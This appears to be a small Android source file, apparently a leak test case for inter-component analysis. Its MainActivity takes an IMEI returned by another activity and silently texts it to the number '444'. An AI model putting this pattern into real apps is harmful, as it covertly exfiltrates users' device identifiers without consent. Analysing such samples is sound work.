package com.example.shiva.statefulintent;

import android.content.Intent;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.telephony.SmsManager;

public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Intent i = new Intent(MainActivity.this, GetActivity.class);
        startActivityForResult(i, 1);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent imeiData)
    {
        String imei=imeiData.getStringExtra("result");
        SmsManager sms = SmsManager.getDefault();
        sms.sendTextMessage("444", null, imei, null, null);
    }

}
